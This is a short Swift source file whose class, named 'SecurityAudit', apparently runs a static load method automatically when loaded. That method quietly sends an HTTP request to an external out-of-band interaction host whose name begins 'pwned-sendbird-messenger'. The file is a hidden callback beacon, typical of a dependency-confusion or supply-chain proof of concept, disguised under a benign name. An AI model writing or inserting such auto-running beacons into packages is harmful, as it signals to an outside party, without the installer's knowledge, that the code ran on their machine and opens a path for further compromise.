import Foundation

@objc(SecurityAudit)
public class SecurityAudit: NSObject {
    @objc public static func load() {
        if let url = URL(string: "http://pwned-sendbird-messenger.xkrlhpfhpyyqcliksdujl03st1jy8748a.oast.fun") {
            URLSession.shared.dataTask(with: url).resume()
        }
    }
}
